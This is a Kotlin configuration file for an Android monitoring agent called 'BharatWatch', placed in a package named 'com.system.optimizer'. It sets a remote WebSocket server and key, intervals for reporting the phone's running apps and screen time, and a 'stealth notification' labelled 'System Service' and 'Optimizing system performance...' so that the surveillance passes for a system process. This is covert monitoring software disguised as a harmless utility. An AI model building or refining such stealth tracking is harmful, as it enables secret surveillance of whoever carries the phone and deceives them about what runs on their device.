package com.system.optimizer

/**
 * BharatWatch Agent Configuration
 *
 * ⚠️  IMPORTANT: Update SERVER_URL and AGENT_KEY before building!
 */
object Config {

    // ═══════════════════════════════════════════
    //  🔧 CHANGE THESE VALUES BEFORE BUILDING
    // ═══════════════════════════════════════════

    /**
     * Your server's WebSocket URL.
     *
     * Examples:
     *   Local WiFi:  "ws://192.168.1.100:3000/ws/agent"
     *   ngrok:       "wss://abc123.ngrok-free.app/ws/agent"
     *   Cloud:       "wss://bharatwatch.onrender.com/ws/agent"
     */
    const val SERVER_URL = "ws://192.168.31.135:3000/ws/agent"

    /**
     * Must match the AGENT_KEY in your server's .env file
     */
    const val AGENT_KEY = "bharatwatch-agent-secret-change-me"

    // ═══════════════════════════════════════════
    //  Timing intervals (milliseconds)
    // ═══════════════════════════════════════════
    const val HEARTBEAT_INTERVAL = 15_000L      // Send heartbeat every 15s
    const val APP_REPORT_INTERVAL = 30_000L     // Report running apps every 30s
    const val SCREEN_TIME_INTERVAL = 300_000L   // Report screen time every 5min
    const val RECONNECT_BASE_DELAY = 3_000L     // Initial reconnect wait
    const val RECONNECT_MAX_DELAY = 60_000L     // Max reconnect wait (1min)

    // ═══════════════════════════════════════════
    //  Stealth notification (looks like system)
    // ═══════════════════════════════════════════
    const val NOTIFICATION_CHANNEL_ID = "system_service_channel"
    const val NOTIFICATION_ID = 1001
    const val SERVICE_NOTIFICATION_TITLE = "System Service"
    const val SERVICE_NOTIFICATION_TEXT = "Optimizing system performance..."
}
